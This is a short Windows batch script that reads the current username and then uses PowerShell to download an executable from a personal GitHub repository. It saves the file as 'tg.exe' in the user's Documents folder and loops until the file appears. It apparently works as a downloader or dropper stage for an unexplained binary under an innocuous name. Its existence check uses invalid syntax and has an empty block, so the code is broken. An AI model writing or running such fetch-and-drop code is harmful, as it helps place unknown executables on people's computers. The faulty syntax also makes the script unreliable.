for /f "tokens=2 delims=\" %%i in ('whoami') do set "user=%%i"
PowerShell -Command "$webClient = New-Object System.Net.WebClient; $webClient.DownloadFile('https://github.com/neginsadeghi2005/project/raw/refs/heads/main/result.exe' , 'C:\Users\%user%\Documents\tg.exe')"

:check
	if "C:\Users\%user%\Documents\tg.exe" exist (
	
	) else ( 
		goto check
	)
